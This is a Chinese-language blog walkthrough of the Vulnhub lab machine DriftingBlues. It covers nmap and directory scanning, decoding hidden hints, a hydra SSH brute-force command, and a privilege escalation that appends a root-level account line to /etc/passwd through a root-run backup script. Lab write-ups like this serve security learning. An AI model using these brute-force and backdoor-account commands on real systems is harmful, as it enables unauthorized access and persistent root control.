<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>console-demo/posts/driftingblues/</title>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><link rel=stylesheet href=https://linksecho.github.io/hugo-theme-console/css/terminal-0.7.2.min.css><link rel=stylesheet href=https://linksecho.github.io/hugo-theme-console/css/animate-4.1.1.min.css><link rel=stylesheet href=https://linksecho.github.io/hugo-theme-console/css/console.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><meta property="og:title" content="DriftingBlues"><meta property="og:description" content="Vulnhub靶机"><meta property="og:type" content="article"><meta property="og:url" content="https://linksecho.github.io/posts/driftingblues/"><meta property="article:published_time" content="2023-09-26T00:00:00+00:00"><meta name=twitter:title content="DriftingBlues"><meta name=twitter:description content="Vulnhub靶机"></head><body class=terminal><div class=container><div class=terminal-nav><header class=terminal-logo><div class="logo terminal-prompt"><a href=https://linksecho.github.io/ class=no-style>console-demo</a>:~#
<a href=https://linksecho.github.io/posts>posts</a>/<a href=https://linksecho.github.io/posts/driftingblues>driftingblues</a>/</div></header><nav class=terminal-menu><ul vocab="https://schema.org/" typeof="BreadcrumbList"><li><a href=https://linksecho.github.io/about/ typeof="ListItem">about/</a></li><li><a href=https://linksecho.github.io/posts/ typeof="ListItem">archive/</a></li><li><a href=https://linksecho.github.io/photos/ typeof="ListItem">photos/</a></li></ul></nav></div></div><div class="container animated zoomIn fast"><h1>DriftingBlues</h1>Sep. 26, 2023<br><br><p><code>nmap 10.9.23.0/24</code> 扫描当前网段，确认靶机 IP：10.9.75.215
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113165133.png alt=image.png></p><p>详细扫描</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# nmap -sV -p- 10.9.23.215
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2024-01-13 16:53 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> bogon <span style=color:#f92672>(</span>10.9.23.215<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.010s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>MAC Address: 08:00:27:1F:2A:48 <span style=color:#f92672>(</span>Oracle VirtualBox virtual NIC<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 32.62 seconds
</span></span></code></pre></div><p>dirb探测隐藏目录</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# dirb http://10.9.23.215 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>DIRB v2.22    
</span></span><span style=display:flex><span>By The Dark Raver
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>START_TIME: Sat Jan <span style=color:#ae81ff>13</span> 16:53:32 <span style=color:#ae81ff>2024</span>
</span></span><span style=display:flex><span>URL_BASE: http://10.9.23.215/
</span></span><span style=display:flex><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GENERATED WORDS: <span style=color:#ae81ff>4612</span>                                                          
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>---- Scanning URL: http://10.9.23.215/ ----
</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.9.23.215/css/                                                                                          
</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.9.23.215/img/                                                                                          
</span></span><span style=display:flex><span>+ http://10.9.23.215/index.html <span style=color:#f92672>(</span>CODE:200|SIZE:7710<span style=color:#f92672>)</span>                                                                            
</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.9.23.215/js/                                                                                           
</span></span><span style=display:flex><span>+ http://10.9.23.215/server-status <span style=color:#f92672>(</span>CODE:403|SIZE:276<span style=color:#f92672>)</span>                           
</span></span><span style=display:flex><span>---- Entering directory: http://10.9.23.215/css/ ----
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>!<span style=color:#f92672>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>Use mode <span style=color:#e6db74>&#39;-w&#39;</span> <span style=color:#66d9ef>if</span> you want to scan it anyway<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>---- Entering directory: http://10.9.23.215/img/ ----
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>!<span style=color:#f92672>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>Use mode <span style=color:#e6db74>&#39;-w&#39;</span> <span style=color:#66d9ef>if</span> you want to scan it anyway<span style=color:#f92672>)</span>                                                     
</span></span><span style=display:flex><span>---- Entering directory: http://10.9.23.215/js/ ----
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>!<span style=color:#f92672>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>Use mode <span style=color:#e6db74>&#39;-w&#39;</span> <span style=color:#66d9ef>if</span> you want to scan it anyway<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>END_TIME: Sat Jan <span style=color:#ae81ff>13</span> 16:53:55 <span style=color:#ae81ff>2024</span>
</span></span><span style=display:flex><span>DOWNLOADED: <span style=color:#ae81ff>4612</span> - FOUND: <span style=color:#ae81ff>2</span>
</span></span></code></pre></div><p>gobuster，探测隐藏目录</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# gobuster dir -u http://10.9.23.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.6
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.9.23.215
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.6
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php,html,txt,sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/index.html           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 7710<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.html                <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/img                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 308<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.9.23.215/img/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 308<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.9.23.215/css/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/js                   <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 307<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.9.23.215/js/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/secret.html          <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 25<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.html                <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>1102800</span> / <span style=color:#ae81ff>1102805</span> <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>      
</span></span></code></pre></div><p>首页F12找到信息
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113170818.png alt=image.png></p><p>使用base64解密一下，得到信息
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113170905.png alt=image.png></p><p>尝试在IP网址后加上访问，发现是使用ook混淆加密的密文
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113170938.png alt=image.png></p><p>在<a href=https://www.splitbrain.org/services/ook>解密网站</a>解密一下，提示我们使用host文件访问，并出现了eric
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113171051.png alt=image.png></p><p>结合首页频繁出现的信息
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113171425.png alt=image.png></p><p>在<code>vim /etc/host</code>文件中添加解析
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113171748.png alt=image.png></p><p>添加好后即可访问成功
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113172023.png alt=image.png></p><p>这里我们再尝试使用gobuster进行目录爆破
使用gobuster进行本地域名爆破,这里如果出现错误无法扫描成功的话，重启一下靶机，再把刚刚填写上的数据删掉，再填写一次，最后再次尝试即可解决问题<code>gobuster host -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code></p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114143110.png alt=image.png></p><p>将test.driftingblues.box再写入host
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114143144.png alt=image.png></p><p>dirb 进行 web 目录扫描
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163342.png alt=image.png></p><p>访问 robots.txt 页面
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163400.png alt=image.png></p><p>再访问 / ssh_cred.txt，得到下面内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>we can use ssh password in case of emergency. it was &#34;1mw4ckyyucky&#34;.
</span></span><span style=display:flex><span>​
</span></span><span style=display:flex><span>sheryl once told me that she added a number to the end of the password.
</span></span><span style=display:flex><span>​
</span></span><span style=display:flex><span>-db
</span></span></code></pre></div><p>使用 hydra 进行 ssh 暴力破解</p><pre tabindex=0><code>hydra -l eric -P pass.txt 192.168.132.158 ssh
</code></pre><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163623.png alt=image.png></p><p>这里我们尝试使用SSH远程登录
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163247.png alt=image.png></p><p>找到第一个Flag
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163654.png alt=image.png></p><p><strong>提权</strong></p><p>在<code>/var/backups</code> 目录下发现了一个<code>backup.sh</code>文件，查看该文件发现所属用户和组属性都为root权限
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114165010.png alt=image.png></p><p>查看该文件
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114165212.png alt=image.png></p><pre tabindex=0><code>这个脚本看起来是一个简单的备份脚本，它使用 `zip` 命令将 `/var/www/` 目录下的内容打包成一个压缩文件 `/tmp/backup.zip`。然后，它尝试使用 `/bin/chmod` 命令，但是缺少参数，因此这行命令可能有错误。

另外，脚本的最后一行 `sudo /tmp/emergency` 表明它在 `/tmp/` 目录下执行了一个名为 `emergency` 的文件，并且可以用 sudo 去执行这个文件。

因此这里我们可以在这个文件中写入 `echo &#34;jack:IGhvWxGrSeLnU:0:0::/root:/bin/bash&#34;&gt;&gt;/etc/passwd`这条命令，向/etc/passwd 文件中写入超级用户以提权（密码为jack）
</code></pre><p>这里我们使用vi编辑器创建 emergency 文件，并写入创建用户命令
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114171316.png alt=image.png>
创建写入成功后，<code>chmod +x emergency</code> 赋予其可执行权限</p><p>接下来可以使用 <a href=https://www.4hou.com/posts/JNKD>pspy</a> 来监听<code>backup.sh</code>进程，监听可知该进程是一个自动执行的进程</p><p>可以看到<code>backup.sh</code>文件已经帮我们写入成功了
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114171958.png alt=image.png></p><p>切换到jack用户，现在已经提权成功了
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114172121.png alt=image.png></p><p>夺旗 flag2
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114172521.png alt=image.png></p><hr><p>参考博客：<a href=https://szczecin.github.io/2022/06/06/Driftingblues-1/>https://szczecin.github.io/2022/06/06/Driftingblues-1/</a></p><div class=footer>Powered by <a href=https://gohugo.io/>Hugo</a> with
<a href=https://github.com/mrmierzejewski/hugo-theme-console/>Console Theme</a>.</div></div></body></html>